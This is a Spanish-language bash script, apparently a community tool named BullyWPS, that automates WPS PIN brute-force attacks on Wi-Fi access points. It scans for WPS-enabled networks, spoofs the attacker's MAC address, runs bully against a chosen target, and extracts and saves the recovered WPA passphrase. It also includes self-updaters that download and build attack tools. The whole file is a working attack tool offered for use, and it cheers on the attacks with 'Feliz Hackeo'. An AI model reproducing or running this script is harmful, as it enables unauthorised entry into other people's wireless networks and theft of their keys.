#!/bin/bash 


# Variables globales
SCRIPT="BullyWPS"
VERSION="2.1"
KEYS="$HOME/$SCRIPT/KEYS"
TMP="/tmp/$SCRIPT"
WPSPIN="pinWPS" 


# Comprobar si la interface está conectada a internet
CheckETH() {
clear
if [ "$(ip route|grep default)" != "" ]; then
  ETH=$(ip route|awk '/default/ {print $5}')
  HW_WIFI=$(ifconfig $WIFI|awk '/HW/ {print $5}'|cut -d- -f1,2,3,4,5,6)
  HW_ETH=$(ifconfig $ETH|awk '/HW/ {print $5}'|tr ':' '-')
  if [ "$HW_ETH" = "$HW_WIFI" ];then
    echo
    echo "[0;31mPara evitar errores, la interface \"$ETH\" no debe estar conectada a internet! [0m"
    echo ""
    echo "Presiona enter para volver al menú"
    read junk
    menu
  fi
fi
}

# Funcion de seleccionar el objetivo a atacar
SeleccionarObjetivo() {
i=0
redesWPS=0
while read BSSID Channel RSSI WPSVersion WPSLocked ESSID;do
  longueur=${#BSSID}
  if [ $longueur -eq 17 ] ; then
    i=$(($i+1))
    WPSbssid[$i]=$BSSID
    WPSchanel[$i]=$Channel
    WPSessid[$i]=$ESSID
    PWR[$i]=$RSSI
  fi
  redesWPS=$i
done < $TMP/wash_capture.$$
if  [ "$redesWPS" = "0" ];then
  clear
  echo ""
  echo ""
  echo "                        * * *     A T E N C I O N     * * *                "
  echo ""
  echo "                          No se ha encontrado ninguna RED "
  echo "                          con WPS activado en la captura"
  echo ""
  echo "                          [1;33mPulsa INTRO para volver al menu"
  read junk
  menu
else
  clear
  echo ""
  echo "                [1;32mLas siguientes redes son susceptibles de ataque con bully[0m"
  echo ""
  echo "            MAC            SOPORTADA?      PWR      Channel      ESSID"
  echo ""
  countWPS=0
  while [ 1 -le $i ]; do
    countWPS=$(($countWPS+1))
    ESSID=${WPSessid[$countWPS]}
    BSSID=${WPSbssid[$countWPS]}
    PWR=${PWR[$countWPS]}
    Chanel=${WPSchanel[$countWPS]}
    echo " $countWPS)  $BSSID         $SOPORTADA          $PWR         $Chanel         $ESSID"
    i=$(($i-1))
  done   
  i=$redesWPS
  echo ""
  echo " 0)  Para volver al menu " 
  echo ""
  echo ""
  echo " --> [1;36mSeleccione una red[0m"
  read WPSoption
  set -- ${WPSoption}

  if [ $WPSoption -le $redesWPS ]; then
    if [ "$WPSoption" = "0" ];then
      menu
    fi
    ESSID=${WPSessid[$WPSoption]}
    BSSID=${WPSbssid[$WPSoption]}
    CHANEL=${WPSchanel[$WPSoption]}
    clear
  else
    echo " Opcion no valida... vuelva a elegir"
    sleep 2
    SeleccionarObjetivo
  fi
fi
ShowWPA="OFF"
InfoAP="ON"
menu
}

# Escanear con wash
WashScan() {
if [ "$WIFI" = "" ]; then auto_select_monitor && WashScan; fi
CheckETH
xterm -icon -e wash -i $WIFI -C -o $TMP/wash_capture.$$ & 
WashPID=$!
sec_rem=30 
sleep 30 && kill $WashPID &>/dev/null &
while true; do
let sec_rem=$sec_rem-1
        interval=$sec_rem
        seconds=`expr $interval % 60`
        interval=`expr $interval - $seconds`
  sleep 1
  clear
  echo "[1;33mEscaneando en busca de objetivos... [1;36m$seconds[0m [1;33msegundos[0m"
  echo ""
  cat $TMP/wash_capture.$$
  if [ ! -e /proc/$WashPID ]; then
    sleep 1
    break
  fi
done
SeleccionarObjetivo
}

auto_select_monitor() {
#! /bin/bash

#poner tarjeta en modo monitor AUTOMATICO

clear
t=0
if [ "$WIFI" = "" ]; then
> $TEMP/wireless.txt
cards=`airmon-ng|cut -d ' ' -f 1 | awk {'print $1'} |grep -v Interface #|grep -v  mon   `
echo $cards >> $TEMP/wireless.txt
tarj1=`cat $TEMP/wireless.txt | cut -d  ' ' -f 1  | awk  '{print $1}'`
tarj2=`cat $TEMP/wireless.txt | cut -d  ' ' -f 2  | awk  '{print $1}'`
rm  -rf $TEMP/wireless.txt

if  [ "$tarj1" = "" ]; then
clear
echo "                  * * *     A T E N C I O N     * * *                "
echo ""
echo "    No se ha encontrado ninguna tarjeta Wireless en este equipo"
echo ""
echo "    Pulsa ENTER para volver al menu"
read yn
menu
fi

if [ "$tarj1" = "$tarj2" ]; then
tarj2=""
fi

tarjselec=$tarj1

if [ "$tarj2" != "" ] ;then
echo
echo
echo "      Se han encontrado las siguientes tarjetas wifi en este equipo"
echo

airmon-ng |awk 'BEGIN { print "Tarjeta  Chip              Driver\n------- ------------------ ----------" } \
  { printf "%-8s %-8s %-1s %10s\n", $1, $2, $3, $4 | "sort -r"}' |grep -v Interface  |grep -v Chipset

echo "      selecciona una para utilizarla en modo monitor"
echo

tarj_wire=""
tarjselec=""
function selectarj {
select tarjselec in `airmon-ng | awk {'print $1 | "sort -r"'} |grep -v Interface |grep -v Chipset  `; do
break;
done

if [ "$tarjselec" = "" ]; then
echo "  La opcion seleccionada no es valida"
echo "  Introduce una opcion valida..."
selectarj
fi
}

if [ "$tarjselec" = "" ]; then
selectarj
fi

echo ""
echo "Interface seleccionado: $tarjselec"

fi
else
echo 
fi
tarjmonitor=${tarjselec:0:3}
if [ "$tarjmonitor" != "mon" ] && [ "$WIFI" = "" ];then
echo ""
echo ""
echo "                    Se está montando la tarjeta en modo monitor"
echo "" 
sleep 1

#limpieza interface

ifconfig $tarjselec down >/dev/null
ifconfig $tarjselec up >/dev/null
        ifconfig $tarjselec down
        ifconfig $tarjselec hw ether 00:11:22:33:44:55
        ifconfig $tarjselec up

airmon-ng start $tarjselec >/dev/null
cards=`airmon-ng|cut -d ' ' -f 1 |awk {'print $1 | "sort -d"'} |grep -v Interface |grep -v wlan`
largo=${#cards}
final=$(($largo-4))
WIFI=${cards:final}
echo  " $WIFI ----> Se utlilizara en modo monitor."
sleep 2

else 
if [ "$WIFI" = "" ];then
WIFI="$tarjselec"

echo "" 
echo  " $WIFI ----> Se utlilizara en modo monitor."
sleep 2
fi
fi
clear

# Spoof Mac Address and put card into monitor mode
echo -e "Quiere cambiar la MAC de su tarjeta wifi? S/n"
 
read b
if [[ $b == "S" || $b == "s" || $b = "" ]]; then
        wmac=00:11:22:33:44:55
        echo
        ifconfig $WIFI down
        macchanger -m 00:11:22:33:44:55 $WIFI
        ifconfig $WIFI up
        echo
        echo
        sleep 3
        else
echo "    Pulsa ENTER para continuar."
read c
if [[ $c == "N" || $c == "n" || $c = "" ]]; then
        ifconfig $tarjselec down
        macchanger -p $tarjselec
        ifconfig $tarjselec up
        tput setaf 1; echo "continuando sin cambiar la MAC"
        echo
        echo
        echo
        sleep 2
fi
fi
}  

function ObtenerWPA_con_pin_o_no {
read -p "Quieres introducir manualmente el pin? S/n :" x y

if [[ $x == "S" || $x == "s" || $x = "" ]]; then
 read -p "pinWPS: " XWPSPIN
 echo ""
 echo ""
 echo ""
xterm -hold -geometry 65x30-1-1 -e bully $WIFI -b $BSSID -c $CHANEL -e $ESSID -p $XWPSPIN -F -B -l 100 -v 3 &
 bullyPID=$!
# Si se presiona "Control+C", se detiene el proceso de bully
trap 'kill $BULLY_PID >/dev/null 2>&1' SIGINT
while true; do
  sleep 1
  clear
echo "[+] Atacando " $BSSID---$ESSID "en el canal " $CHANEL " Buena Suerte y Feliz Hackeo"
  echo "[1;33mObteniendo clave WPA...[0m"
  echo ""
  if [ ! -e /proc/$bullyPID ]; then
    sleep 2
    break
  fi
done
echo ""
if [ "$(tail -n 2 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|grep "signal 0$")" ]; then
             PIN="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $2}')"
CLAVE_WPA="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $4}')"
if [ "$WPA_KEY" = "" ]; then
  WPA_TXT="$(echo $ESSID)_$(echo $BSSID|tr ':' '-').txt"
  echo "ESSID: $ESSID" >  $TMP/$WPA_TXT
  echo "PIN WPS: $PIN" >> $TMP/$WPA_TXT
  echo "CLAVE WPA: $CLAVE_WPA" >> $TMP/$WPA_TXT
  cat $TMP/$WPA_TXT|sed -e 's/$/\r/' > $KEYS/$WPA_TXT
  ShowWPA="ON"
  echo "[1;31mLa clave ha sido guardada en \"$KEYS/$WPA_TXT\"[0m"
echo ""
echo "Presiona enter para volver al menu"
read junk
menu
fi
fi
clear
echo "" 
echo "" 
echo "" 
wait
else

# Pulsa ENTER para continuar

echo "    Pulsa ENTER para continuar."
if [[ $y == "N" || $y == "n" || $y = "" ]]; then
read y

# Attack the Access point
 
xterm -hold -geometry 65x30-1-1 -e bully $WIFI -b $BSSID -c $CHANEL -e $ESSID -F -l 100 -v 3 &
bullyPID=$!
# Si se presiona "Control+C", se detiene el proceso de bully
trap 'kill $BULLY_PID >/dev/null 2>&1' SIGINT
while true; do
  sleep 1
  clear
echo "[+] Atacando " $BSSID---$ESSID "en el canal " $CHANEL " Buena Suerte y Feliz Hackeo"
  echo "[1;33mObteniendo clave WPA...[0m"
  echo ""
  if [ ! -e /proc/$bullyPID ]; then
    sleep 2
    break
  fi
done
echo ""
if [ "$(tail -n 2 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|grep "signal 0$")" ]; then
             PIN="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $2}')"
CLAVE_WPA="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $4}')"
if [ "$WPA_KEY" = "" ]; then
  WPA_TXT="$(echo $ESSID)_$(echo $BSSID|tr ':' '-').txt"
  echo "ESSID: $ESSID" >  $TMP/$WPA_TXT
  echo "PIN WPS: $PIN" >> $TMP/$WPA_TXT
  echo "CLAVE WPA: $CLAVE_WPA" >> $TMP/$WPA_TXT
  cat $TMP/$WPA_TXT|sed -e 's/$/\r/' > $KEYS/$WPA_TXT
  ShowWPA="ON"
  echo "[1;31mLa clave ha sido guardada en \"$KEYS/$WPA_TXT\"[0m"
echo "" 
sleep 3
wait
# Pulsa ENTER para volver al menu
echo ""
echo "Presiona enter para volver al menu"
read junk
menu
fi
fi
fi
fi
}

function ObtenerWPA {
read -p "Quieres introducir manualmente el pin? S/n :" y

if [[ $y == "S" || $y == "s" || $y = "" ]]; then
read -p "pinWPS: " yWPSPIN
 echo ""
 echo ""
 echo ""
xterm -hold -geometry 65x30-1-1 -e bully $WIFI -b $BSSID -c $CHANEL -e $ESSID -p $yWPSPIN -F -B -v 3 &
bullyPID=$!
# Si se presiona "Control+C", se detiene el proceso de bully
trap 'kill $BULLY_PID >/dev/null 2>&1' SIGINT
while true; do
  sleep 1
  clear
echo "[+] Atacando " $BSSID---$ESSID "en el canal " $CHANEL " Buena Suerte y Feliz Hackeo"
  echo "[1;33mObteniendo clave WPA...[0m"
  echo ""
  if [ ! -e /proc/$bullyPID ]; then
    sleep 2
    break
  fi
done
echo ""
if [ "$(tail -n 2 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|grep "signal 0$")" ]; then
             PIN="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $2}')"
CLAVE_WPA="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $4}')"
if [ "$WPA_KEY" = "" ]; then
  WPA_TXT="$(echo $ESSID)_$(echo $BSSID|tr ':' '-').txt"
  echo "ESSID: $ESSID" >  $TMP/$WPA_TXT
  echo "PIN WPS: $PIN" >> $TMP/$WPA_TXT
  echo "CLAVE WPA: $CLAVE_WPA" >> $TMP/$WPA_TXT
  cat $TMP/$WPA_TXT|sed -e 's/$/\r/' > $KEYS/$WPA_TXT
  ShowWPA="ON"
  echo "[1;31mLa clave ha sido guardada en \"$KEYS/$WPA_TXT\"[0m"
fi
fi
clear
echo "" 
echo "" 
echo "" 
wait
else
echo "    Pulsa ENTER para continuar."
if [[ $e == "N" || $e == "n" || $e = "" ]]; then
read e
# Attack the Access point
 
xterm -hold -geometry 65x30-1-1 -e bully $WIFI -b $BSSID -c $CHANEL -e $ESSID --force -B -v 3 &
 bullyPID=$!
# Si se presiona "Control+C", se detiene el proceso de bully
trap 'kill $BULLY_PID >/dev/null 2>&1' SIGINT
while true; do
  sleep 1
  clear
echo "[+] Atacando " $BSSID---$ESSID "en el canal " $CHANEL " Buena Suerte y Feliz Hackeo"
  echo "[1;33mObteniendo clave WPA...[0m"
  echo ""
  if [ ! -e /proc/$bullyPID ]; then
    sleep 2
    break
  fi
done
echo ""
if [ "$(tail -n 2 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|grep "signal 0$")" ]; then
             PIN="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $2}')"
CLAVE_WPA="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $4}')"
if [ "$WPA_KEY" = "" ]; then
  WPA_TXT="$(echo $ESSID)_$(echo $BSSID|tr ':' '-').txt"
  echo "ESSID: $ESSID" >  $TMP/$WPA_TXT
  echo "PIN WPS: $PIN" >> $TMP/$WPA_TXT
  echo "CLAVE WPA: $CLAVE_WPA" >> $TMP/$WPA_TXT
  cat $TMP/$WPA_TXT|sed -e 's/$/\r/' > $KEYS/$WPA_TXT
  ShowWPA="ON"
  echo "[1;31mLa clave ha sido guardada en \"$KEYS/$WPA_TXT\"[0m"
sleep 3
echo ""
echo "Presiona enter para volver al menu"
read junk
menu
fi
fi
fi
fi
}

function Primer_pin {
read -p "Quieres introducir manualmente el pin? S/n :" d

if [[ $d == "S" || $d == "s" || $d = "" ]]; then
read -p "pinWPS: " dWPSPIN
 echo ""
 echo ""
 echo ""
CheckETH
xterm -hold -geometry 65x30-1-1 -e bully  $WIFI -b $BSSID -c $CHANEL -e $ESSID -p $dWPSPIN -F -B -v 3  & 
bullyPID=$!
# Si se presiona "Control+C", se detiene el proceso de bully
trap 'kill $BULLY_PID >/dev/null 2>&1' SIGINT
while true; do
  sleep 1
  clear
echo "[+] Atacando " $BSSID---$ESSID "en el canal " $CHANEL " Buena Suerte y Feliz Hackeo"
  echo "[1;33mObteniendo clave WPA...[0m"
  echo ""
  if [ ! -e /proc/$bullyPID ]; then
    sleep 2
    break
  fi
done
echo ""
if [ "$(tail -n 2 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|grep "signal 0$")" ]; then
             PIN="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $2}')"
CLAVE_WPA="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $4}')"
if [ "$WPA_KEY" = "" ]; then
  WPA_TXT="$(echo $ESSID)_$(echo $BSSID|tr ':' '-').txt"
  echo "ESSID: $ESSID" >  $TMP/$WPA_TXT
  echo "PIN WPS: $PIN" >> $TMP/$WPA_TXT
  echo "CLAVE WPA: $CLAVE_WPA" >> $TMP/$WPA_TXT
  cat $TMP/$WPA_TXT|sed -e 's/$/\r/' > $KEYS/$WPA_TXT
  ShowWPA="ON"
  echo "[1;31mLa clave ha sido guardada en \"$KEYS/$WPA_TXT\"[0m"
sleep 3
echo ""
echo "Presiona enter para volver al menu"
read junk
menu
fi
fi
fi
}

#Función añadir comandos a bully
function optional_functions {
#Set optional functions
bully #to show the options available in terminal
echo "[+] bully $WIFI -b $BSSID -c $CHANEL -e $ESSID"
echo "[+] Introduce otras funciones para atacar con bully ex -A -C -D ,etc con espacios"
read bullyVars
#Start
xterm -hold -geometry 65x30-1-1 -e bully $WIFI -b $BSSID -c $CHANEL -e $ESSID $bullyVars & 
bullyPID=$!
# Si se presiona "Control+C", se detiene el proceso de bully
trap 'kill $BULLY_PID >/dev/null 2>&1' SIGINT
while true; do
  sleep 1
  clear
echo "[+] Starting bully (bully $WIFI -b $BSSID -c $CHANEL -e $ESSID $bullyVars)"
echo "[+] Atacando " $BSSID---$ESSID "en el canal " $CHANEL " Buena Suerte y Feliz Hackeo"
  echo "[1;33mObteniendo clave WPA...[0m"
  echo ""
  if [ ! -e /proc/$bullyPID ]; then
    sleep 2
    break
  fi
done
echo ""
if [ "$(tail -n 2 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|grep "signal 0$")" ]; then
             PIN="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $2}')"
CLAVE_WPA="$(tail -n 1 "$HOME/.bully/$( echo $BSSID|tr '[:upper:]' '[:lower:]'|tr -d ':').run"|tr ':' ' '|awk '{print $4}')"
if [ "$WPA_KEY" = "" ]; then
  WPA_TXT="$(echo $ESSID)_$(echo $BSSID|tr ':' '-').txt"
  echo "ESSID: $ESSID" >  $TMP/$WPA_TXT
  echo "PIN WPS: $PIN" >> $TMP/$WPA_TXT
  echo "CLAVE WPA: $CLAVE_WPA" >> $TMP/$WPA_TXT
  cat $TMP/$WPA_TXT|sed -e 's/$/\r/' > $KEYS/$WPA_TXT
  ShowWPA="ON"
  echo "[1;31mLa clave ha sido guardada en \"$KEYS/$WPA_TXT\"[0m"
sleep 3
echo ""
echo ""
echo "Presiona enter para volver al menu"
read junk
menu
fi
fi
}

#Función actualizar bully
function bully_update {
echo "   "
echo "          [1;32mBienvenido al auto-actualizador para bully[0m"
echo ""
echo "        [1;36m[Se requiere internet para la descarga de bully][0m"
echo ""
sleep 1
echo "Se procede a la descarga de la ultima version mediante svn"
sleep 3

# Descargamos la ultima revision con svn
cd /tmp
echo "[1;32m"
svn co http://bully.googlecode.com/svn/trunk/src/ /tmp/bully-read-only && \
echo [0m
cd /tmp/bully-read-only
clear
sleep 2

# Identificamos la version
if [ ! -d ".svn/" ]
then
	echo "0"
	exit ;
fi

REVISION="`svnversion 2> /dev/null | sed 's/[^0-9]*//g'`"

if [ x$REVISION = "x" ]
then
	REVISION="`svn info 2> /dev/null | grep -i revision | sed
's/[^0-9]*//g'`"
fi

if [ x$REVISION = "x" ]
then
	if [ -f ".svn/entries" ]
	then
		REVISION="`cat .svn/entries | grep -i revision | head -n 1 | sed
's/[^0-9]*//g'`"
	fi
fi

if [ x$REVISION = "x" ]
then
	REVISION="-1"
fi

# Informamos de la version
echo ""
echo ""
echo "                      [1;33m<<[0m Descargada revision-[1;32m$REVISION
[1;33m>>[0m"
sleep 3

# Compilamos
echo ""
echo ""
echo "[1;33mSe procede a compilar el paquete ..."
sleep 3
echo "[1;36m"
make  && \
echo "[0m"
clear
sleep 3

# Instalamos en sistema
echo ""
echo ""
echo "[1;35mSe procede a instalar el paquete en el sistema..."
sleep 3
echo ""
echo "[1;33m"
make install && \
echo "[0m"
clear
sleep 3


# Limpiamos
echo ""
echo ""
echo "[1;36mRealizando limpieza de archivos temporales..."
echo ""
sleep 3
rm -Rf /tmp/bully-read-only/trunk/src/ &> /dev/null
rm -Rf $DESTDIR &> /dev/null
sleep 2

# Informamos de la finalizacion del proceso
echo ""
echo ""
echo "[1;33mTodos los procesos han terminado "
echo ""
echo ""
sleep 3
wait

# Pulsa ENTER para volver al menu

echo ""
echo "    Pulsa ENTER para volver al menu"
read yn
menu
}
#Función actualizar macchanger
function macchanger_update {
echo "   "
echo "          [1;32mBienvenido al auto-actualizador para macchanger[0m"
echo ""
echo "        [1;36m[Se requiere internet para la descarga de macchanger][0m"
echo ""
sleep 1
echo "Se procede a la descarga de la ultima version "
sleep 3

# Descargamos la ultima revision con svn
cd /tmp
echo "[1;32m"
git clone http://github.com/alobbs/macchanger/ /tmp/macchanger && \
echo [0m
cd /tmp/macchanger
clear
sleep 2
# Compilamos
echo ""
echo ""
echo "[1;33mSe procede a compilar el paquete ..."
sleep 3
echo "[1;36m"
bash autogen.sh
echo "[0m"
sleep 3
make  && \
echo "[0m"
clear
sleep 3

# Instalamos en sistema
echo ""
echo ""
echo "[1;35mSe procede a instalar el paquete en el sistema..."
sleep 3
echo ""
echo "[1;33m"
make install && \
echo "[0m"
clear
sleep 3


# Limpiamos
echo ""
echo ""
echo "[1;36mRealizando limpieza de archivos temporales..."
echo ""
sleep 3
rm -Rf /tmp/macchanger/ &> /dev/null
sleep 2

# Informamos de la finalizacion del proceso
echo ""
echo ""
echo "[1;33mTodos los procesos han terminado "
echo ""
echo ""
sleep 3
wait

# Pulsa ENTER para volver al menu

echo ""
echo "    Pulsa ENTER para volver al menu"
read yn
menu
}

#Función de desmontar tarjeta y salir
function DESMONTAR_tarj_y_salir {
if [ "$WIFI" != "" ]; then
clear
echo ""
  echo ""
  echo ""
  echo "	[1;33m####################################################################"
  echo "	[1;33m###                                                              ###"
  echo "	[1;33m###     ¿ quiere desnontar la tarjeta antes de salir?            ###"
  echo "	[1;33m###                                                              ###"
  echo "	[1;33m###        (n) no   -> Salir sin desmontar                       ###"
  echo "	[1;33m###        (m) Menú -> Volver al menú principal                  ###"
  echo "	[1;33m###        ENTER    -> Desmontar y Salir                         ###"
  echo "	[1;33m###       (r)+ENTER -> Restablecer mac a la original             ###"
  echo "	[1;33m###                                                              ###"
  echo "	[1;33m####################################################################"
  echo ""
  echo ""
read salida
set -- ${salida}

if [ "$salida" = "r" ]; then
ifconfig $tarjselec down
macchanger -p $tarjselec
ifconfig $tarjselec up
fi
if [ "$salida" = "m" ]; then
menu
fi
if [ "$salida" = "n" ]; then
  echo ""
echo "         Hasta Pronto..."
sleep 2
clear 
exit
fi
echo "$WIFI Ha sido desmontada"
airmon-ng stop $WIFI >/dev/null
fi
  echo ""
echo "         Hasta Pronto..."
sleep 2
clear
 exit

}

menu() {
# Bienvenida
echo " #########################################################################################"
echo " #                                                                                       #"
echo " #    ~Script de automatizacion de bully para ataque WPS escrito en bash por @cristi_28  #"
echo " #    1-Probado en Kali Linux                                                            #"
echo " #    2-Asegurese de que su adaptador wifi esta conectado al iniciar el script           #"
echo " #    3-Cualquier problema con el script contacte libremente en  http://lampiweb.com     #"
echo " #    4-VERSION:     * BullyWPS $VERSION *                                                    #"
echo " #                                                                                       #"
echo " #                                                                                       #"
echo " #########################################################################################"
sleep 1
echo "---------------------------------------"
if [ "$InfoAP" = "ON" ]; then
  echo "INFO AP OBJETIVO"
  echo ""
  echo "              ESSID = $ESSID"
  echo "              Canal = $CHANEL"
  echo "         MAC del AP = $BSSID"
  fi
  if [ "$ShowWPA" = "ON" ]; then
  echo "          Clave WPA = $WPA_KEY"
  fi
  echo "---------------------------------------"
echo ""
echo " 1) Buscar objetivos con WPS activado"
echo ""
echo " 2) Seleccionar otro objetivo"
echo ""
echo " 3) Obtener clave WPA con bully"
echo ""
echo " 4) Obtener clave WPA router sin checksum " 
echo ""
echo " 5) Añadir comandos a bully ( ex: -N -Z ,etc ) "
echo ""
echo " 6) 4 digitos + xxxx"
echo ""
echo " 7) actualizar bully"
echo ""
echo " 8) actualizar macchanger"
echo ""
echo " 0) Salir"
echo ""
read -p " #> " CHOISE
echo ""
case $CHOISE in
  1 ) WashScan;;
  2 ) SeleccionarObjetivo;;
  3 ) ObtenerWPA_con_pin_o_no;;
  4 ) ObtenerWPA;;
  5 ) optional_functions;;
  6 ) Primer_pin;;
  7 ) bully_update;;
  8 ) macchanger_update;;
  0 ) DESMONTAR_tarj_y_salir;;
  * ) echo "Opción incorrecta"; menu;;
esac
}

# Comprobacion de usuario
if [ "$(whoami)" != "root" ]; then
 echo -e '\e[1;31m


    ¡¡¡ Debes ser root para ejecutar este script !!!

        Prueba: sudo $0

\e[0m' 

 exit 1
fi

# Crear directorios si no existen
if [ ! -d $TMP ]; then mkdir -p $TMP; else rm -rf $TMP/*; fi
if [ ! -d $KEYS ]; then mkdir -p $KEYS; fi
if [ -d $HOME/Desktop/Wireless-Keys ]; then
  if [ ! -d $HOME/Desktop/Wireless-Keys/$SCRIPT-keys ]; then
    ln -s $KEYS $HOME/Desktop/Wireless-Keys/$SCRIPT-keys
  fi
fi

# Eliminando interfaces en monitor
interfaces=$(ifconfig|awk '/^mon/ {print $1}')
if [ "$interfaces" != "" ]; then
  for monx in $interfaces; do
    airmon-ng stop $monx up >/dev/null 2>&1
  done
fi

menu
